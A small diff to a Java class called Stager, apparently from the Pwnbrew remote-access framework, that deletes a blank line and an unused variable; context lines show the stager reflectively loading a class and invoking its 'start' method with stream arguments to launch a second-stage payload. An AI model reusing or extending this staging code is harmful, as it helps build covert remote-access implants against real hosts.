@@ -140,7 +140,6 @@ public class Stager extends ClassLoader {
                         }
                     }
 
-
                     //Start timer
                     aTimer.run();
 
@@ -338,7 +337,7 @@ public class Stager extends ClassLoader {
 
                         Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
                         aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
-                        int i =0;
+                    
                     }   
             }
         
